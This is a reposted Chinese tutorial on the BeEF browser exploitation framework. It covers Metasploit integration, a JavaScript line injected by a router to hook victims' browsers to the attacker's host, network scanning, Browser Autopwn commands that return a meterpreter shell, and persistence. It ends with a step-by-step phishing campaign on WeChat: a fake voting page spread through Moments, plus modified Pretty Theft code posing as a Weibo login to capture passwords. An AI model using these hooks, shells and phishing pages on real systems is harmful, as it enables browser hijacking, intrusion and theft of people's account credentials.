<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.vuln.cn](https://www.vuln.cn/6966)

> 原文地址: http://drops.wooyun.org/tips/9929 0x00 前言 BeEF，全称 T […]

BeEF，全称 The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 目前对其测试的文章不是很多，所以希望通过本次测试给大家带来全新的认识。

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145062830.net/20151022083146982)

工具主页：[http://beefproject.com](http://beefproject.com/)

工具框架:

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145185793.net/20151022083159570)

攻击主机:

```
操作系统:Kali 1.0
IP:192.168.16.245
```

测试主机:

```
操作系统:Win7x86
IP:192.168.16.197
```

路由器：

```
WooyunWifi
开启JS注入功能
```

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145157165.net/20151022083213344)

**_Tips：_**

```
WooyunWifi开启JS注入功能后会对用户访问的页面加入JS代码，如果JS代码设置成如下格式，那么运行后会在BeEF控制端返回一个shell

document.write("<script language='javascript' src='http://192.168.16.245:3000/hook.js'></script>");

默认情况下JS注入附带缓存投毒功能，将视图缓存所有的页面至2099年，但可以通过清除所有缓存及浏览数据来清除缓存投毒的影响。
```

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145270248.net/20151022083228639)

BeEF 在 Kali 下默认安装，直接找到对应图标启动即可，但是默认设置未同 Metasploit 关联，无法使用 msf 模块，因此需要作如下配置连接 msf

1、修改 config.yaml
----------------

编辑  
`/usr/share/beef-xss/config.yaml`

```
metasploit:
            enable: false改为true
```

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145346766.net/20151022104332165)

编辑  
`/usr/share/beef-xss/extensions/demos/config.yaml`

```
enable:true改为false
```

编辑  
`/usr/share/beef-xss/extensions/metasploit/config.yaml`

```
设置
    ssl: true
    ssl_version: 'TLSv1'
```

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145357713.net/20151022104345499)

2、启动 msf 服务
-----------

```
service postgresql start
service metasploit start
msfconsole
load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
```

3、运行 BeEF.rb
------------

```
cd /usr/share/beef-xss/
/usr/share/beef-xss/beef
```

（启动后不要关闭，不然登录界面会提示密码错误）

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145317624.net/20151022104402951)

4、启动 BeEF
---------

弹出浏览器，输入默认用户名口令 beef，即可登陆

主界面如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145449856.net/20151022083247247)

对基本功能做全面介绍，高级用法以后会做补充

1 - 信息收集
--------

**1、浏览器信息** 可收集：

```
浏览器名称版本
浏览器用户版本
插件（包括Java，ActiveX，VBS，Flash……）
窗口大小
```

收集方法：

（1）自动默认收集信息  
如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145585577.net/20151022083300750)

（2）插件收集信息  
如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145540408.net/20151022083309821)

**_Tips：_**

```
模块图标不同颜色对应不同的使用效果
绿色：适用当前浏览器
橙色：适用当前浏览器，但易被用户发现，social engineering模块默认为橙色
红色：不适于当前浏览器，但仍可尝试
```

**2、系统信息**

可收集：

```
安装的软件(适用于IE下，Detect Software模块)
注册表键值(适用于IE下，此时会弹出提示消息)
内网IP(Java模块得到授权)
系统详情(通过JavaApplet获取系统版本、Java VM details、NIC names and IP、处理器、内存、屏幕显示模式)
定位(通过Google maps)
剪贴板信息(会弹出提示消息)
```

如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145663762.net/20151022083323152)

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145671713.net/20151022083332056)

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145769389.net/20151022083340397)

**3、用户行为**

可收集：

```
用户是否访问过某URL、domain
是否登录特定网站账号
是否使用TOR
```

如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145782182.net/20151022083350643)

2 - 社会工程
--------

如果使用 BeEF 控制了浏览器，那么就可以修改整个页面来尝试社会工程学

**1、提交登录信息**

简单粗暴往往是最有效的

**Pretty Theft 模块:**

在网页弹出诱骗消息需要用户输入登录和密码，并解释该会话已超时

选择的登录框模板, 如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145856372.net/20151022083404865)

配置后用户浏览器界面, 如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301145879803.net/20151022083415070)

当用户输入信息后，自动获取，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102302210051649.net/20151022083424837)

**Simple Hijacker 模块:**

劫持网页上面的所有链接，当用户点击任意链接时弹出诱骗消息，如果用户接着点击会跳转到指定域名  
如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150113920.net/20151022083437512)

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150154942.net/20151022083445466)

**Clippy 模块：**

创建一个浏览器助手提示用户点击  
如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150267543.net/20151022083456544)

**2、重定向**

**Rediret Browser 模块：**

将当前页面重定向至指定页面，有可能导致当前权限丢失

**Rediret Browser(iframe) 模块：**

将当前页面重定向至指定页面，，同时保留当前连接，可以维持当前浏览器权限  
如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150256728.net/20151022083509229)

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150362535.net/20151022083517486)

**TabNabbing 模块：**

当检测用户不在当前页面时启动定时器，倒计时结束后自动重定向至指定页面  
如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150377764.net/20151022083528801)

**3、Chrome/Firefox extensions**

**Fake Flash Update 模块：**

提示用户安装 Adobe Flash Player 的更新，用户点击后会下载指定文件  
如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150496763.net/20151022083541006)

**Chrome Extensions 系列：**

值得尝试

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150461161.net/20151022083557973)

**4、补充**

**Clickjacking 模块：**

可以使用 multi-click clickjacking，判断当前用户鼠标位置，在不同位置可触发不同 JS 代码  
如图，鼠标后面跟随一个 iframe

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150418022.net/20151022083610151)

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150580322.net/20151022083616748)

3 - 网络扫描
--------

通过 JavaScript，可以尝试利用浏览器扫描内网

**1、获取内网 IP**

**Get Internal IP WebRTC 模块：**

通过 WebRTC 获取内网 IP

**Get Internal IP 模块：**

通过 Java Socket class 获取内网 IP

**2、识别局域网子网**

识别内网网关，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150562397.net/20151022083627694)

**3、识别 HTTP Servers**

识别内网 web servers

**4、ping 操作**

调用 ping 命令扫描内网

**Ping Sweep 模块 Ping Sweep (Java) 模块**

如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150670607.net/20151022083637572)

**5、跨域扫描**

**6、DNS 枚举**

如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150661420.net/20151022083647034)

**7、端口扫描**

**Port Scanner 模块**

如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150756867.net/20151022083702339)

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150733438.net/20151022083711912)

**8、网络指纹特征扫描**

用来扫描内网中的 Web 服务器和网络设备

**Fingerprint Network 模块**

如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150847214.net/20151022083720822)

**9、Remote CSRFs**

**10、IRC NAT Pinning**

模拟浏览器的 IRC 通信，可用来绕过防火墙

**11、网络拓扑**

BeEF 可根据扫描获得的信息绘制内网网络拓扑 如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150814032.net/20151022083731946)

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150993686.net/20151022083739902)

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301150983980.net/20151022083748579)

此部分会在以后详细介绍

4 - 结合 Metasploit
-----------------

**1、Metasploit 系列模块**

如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301151061745.net/20151022083758254)

**2、Browser Autopwn**

反弹回 meterpreter

方法：

**（1）**使用 Metasploit 的 Browser Autopwn 功能生成 BrowserAutoPwn URL

```
use auxiliary/server/browser_autopwn
show options
set LHOST 192.168.16.245
set SRVHOST 192.168.16.245
set SRVPORT 8881
run -z
```

生成一个链接，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301151011311.net/20151022083810204)

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301151133837.net/20151022083817418)

**（2）**使用”Create Invisible Iframe” 模块加载 autopwn 页面

如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301151147323.net/20151022083828136)

**（3）**等待弹回 shell

```
sessions -l
```

5-Tunneling
-----------

代理功能

方法：

**1、**选择控制的浏览器

如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301151241719.net/20151022083840702)

**2、**浏览器代理设置

HTTP Proxy：127.0.0.1  
Port：6789

如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301151387599.net/20151022083849851)

细节以后补充

**3、**访问同样网站，查看本机浏览器页面同被控浏览器页面内容是否相同（即不需要 cookie 可实现登录账号）

6-XSS
-----

如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301151419037.net/20151022083900296)

细节以后补充

7 - 维持权限
--------

**1、Create Pop Under 模块**

创建一个新窗口，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301151411108.net/20151022083914494)

反弹一个新权限，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301151569782.net/20151022083922383)

**2、Confirm Close Tab 模块**

当用户关闭当前页面时，反复弹出确认是否关闭页面的消息

**3、Create Foreground iFrame 模块** 修改当前页面所有链接来避免离开当前页面  
比如用户点击某个连接，会将新页面显示在当前页面上面，注意的是网址不会发送改变，如图：

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301151565410.net/20151022083934216)

正常访问的页面为：（注意看地址栏）

![](https://www.vuln.cn/wp-content/uploads/drops/20151023/2015102301151580912.net/20151022083942733)

**4、Man In The Browser 模块**

可拦截修改页面内所有链接，当用户点击当前页面的任意链接后仍可维持权限（必须是同源的页面）  
如果用户手动更改 URL 地址栏，无法维持权限

本文仅对 BeEF 的基本功能做了全面介绍，更多高级技巧很值得研究，例如利用 BeEF 内网渗透，利用代理不通过 cookie 登陆账户突破 IP 限制绑定等等。

测试过程难免会有疏忽遗漏，理解错误的地方欢迎指正，共同进步。

本文由三好学生原创并首发于乌云 drops，转载请注明

对手机平台的微信使用 BeEF 进行模拟测试

手机系统:

```
Android
```

1、上线方法：
-------

**1、扫描二维码**

扫描后在 BeEF 控制端看到手机上线，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707054147703.net/20151026163837987)

对此页面进行 Google Phishing 欺骗，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707054297348.net/20151026163847667)

**注：**

在微信上面特别的地方在于此处无法看到包含的真实 URL 地址

**2、朋友圈分享**

将 BeEF 的上线地址做一下简单的伪装并分享到朋友圈，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707054264998.net/20151026163905325)

在朋友圈中同样无法看到包含的真实 URL 地址，打开即为 BeEF 的 hook 页面，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707054319626.net/20151026163914384)

**3、朋友发来的链接**

将此消息直接发给朋友，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707054330130.net/20151026163924054)

我们可以看到伪造前的 URL 地址

**注：**

BeEF 的 hook 页面可以自定义成更具欺骗性的内容，这是为了演示方便使用默认界面

2、微信浏览器被 Hook 后可以做哪些操作
----------------------

也许有人会提出疑问：手机打开网址持续的时间很短，关闭当前页面后 BeEF 的 shell 就会下线

**解决方法：**

使用 BeEF API，用户上线后能够自动执行批量命令，结合 Persistence 模块能够极大提高 shell 存活时间

除了与 windows 系统相关的信息无法获取，其他操作均能成功执行，并且 BeEF 为手机劫持提供了专门的模块系列——Phonegap，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707054378723.net/20151026163934233)

以下是经测试可以在 Android 上使用的模块：

```
1、弹框
2、重定向 
3、查看是否访问过某些网站
4、Creates an invisible iframe
5、Social Engineering系列，如下图，仅作演示 
6、msf系列
7、NetWork系列，可以用来扫描同一内网下的windows主机
```

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707054446980.net/20151026163943506)

**注：**

加载 hook 页面后，将手机屏幕关闭处于待机状态，BeEF 仍然可以执行指令，或许这与手机系统相关，值得以后深入测试。

1、伪造 BeEF 的 hook 页面
-------------------

**1、寻找模板**

随机找到一个投票的页面，保存为 html

```
http://mp.weixin.qq.com/s?__biz=MzA3MTM0NTgyNw==&mid=400240804&idx=1&sn=d87655d4c67a8f39fc84b3cdcb4c1895&scene=1&srcid=1024yDcPJI2to0i3DmiVmj1L&from=groupmessage&isappinstalled=0#rd
```

**2、替换 hook 页面**

在`use/share/beef-xss/extensions/demos/html`目录下，将上述 html 文件命名为 basic.html 并添加以下代码

```
var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '/hook.js" 
type="text/javascript"><\/script>';
        document.write(commandModuleStr);
```

如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707054442197.net/20151026193230131)

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707054595128.net/20151026193237033)

上线页面已被修改

2、修改 BeEFsocial_engineering 模块
------------------------------

修改弹出对话框样式

将此文件 use/share/beef-xss/modules/social_engineering/pretty_theft/command.js 内容 对应部分替换如下：

```
// Facebook floating div
    function facebook() {

        sneakydiv = document.createElement('div');
        sneakydiv.setAttribute('id', 'popup');
        sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:2%; z-index:51; background-

color:ffffff;');
        document.body.appendChild(sneakydiv);

        // Set appearance using styles, maybe cleaner way to do this with CSS block?
        var windowborder = 'style="width:330px;background:white;border:10px #999999 solid;border-

radius:8px"';
        var windowmain = 'style="border:1px #555 solid;"';
        var tbarstyle = 'style="color: rgb(255, 255, 255); background-color: rgb(255, 102, 0);font-size: 

13px;font-family:tahoma,verdana,arial,sans-serif;font-weight: bold;padding: 5px;padding-left:8px;text-align: 

left;height: 18px;"';
        var bbarstyle = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 

8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
        var messagestyle = 'style="align:left;font-size:11px;font-family:tahoma,verdana,arial,sans-

serif;margin:10px 15px;line-height:12px;height:40px;"';
        var box_prestyle = 'style="color: grey;font-size: 11px;font-weight: bold;font-family: 

tahoma,verdana,arial,sans-serif;padding-left:30px;"';
        var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-

left:4px;border-style: solid;border-width: 1px;border-color: rgb(255,102,0);"'; 
        var buttonstyle = 'style="font-size: 13px;background:#ff6600;color:#fff;font-weight:bold;border: 

1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';

            var title = '微博手机版安全登录';
            var messagewords = '请输入您的用户名密码登录后进行投票。<br/><br/>我们将对您的投票信息严格保密。';
            var buttonLabel = '<input type="button"  ' +buttonstyle+ ' 

onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" 

onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900>';

        // Build page including styles
        sneakydiv.innerHTML= '<div id="window_container" '+windowborder+ '><div id="windowmain" ' 

+windowmain+ '><div id="title_bar" ' +tbarstyle+ '>' +title+ '</div><p id="message" ' +messagestyle+ '>' + 

messagewords + '</p><table><tr><td align="right"> <div id="box_pre" ' +box_prestyle+ '>邮箱/会员帐号/手机号: 

</div></td><td align="left"><input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) 

document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/></td></tr><tr><td align="right"><div 

id="box_pre" ' +box_prestyle+ '>密码: </div></td><td align="left"><input type="password" id="pass"  

onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ 

'/></td></tr></table>' + '<div id="bottom_bar" ' +bbarstyle+ '>' +buttonLabel+ '<input type="hidden" 

id="buttonpress" /></div></div></div>';

        // Repeatedly check if button has been pressed
        credgrabber = setInterval(checker,1000);
    }
```

3、实际操作
------

**1、**微信朋友圈发布投票消息，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707055832230.net/20151026193255132)

用户点击后会打开我们伪造的投票页面，同时隐蔽加载 hook.js，在 BeEF 端上线

**2、**在用户手机弹出模拟微博登录的对话框

如图执行 Pretty Theft 模块

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707055961806.net/20151026193309303)

用户手机界面如图，弹出对话框提示输入登录消息

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707055994211.net/20151026193324698)

BeEF 控制端返回用户输入消息，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707060088962.net/20151026193334061)

**3、**用户提交后重定向至另一页面

BeEF 控制端使用 Redirect Browser（iFrame）模块，如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707060010150.net/20151026193342717)

用户手机界面如图

![](https://www.vuln.cn/wp-content/uploads/drops/20151027/2015102707060195169.net/20151026193355641)

至此，通过朋友圈投票获得微博帐号成功实现。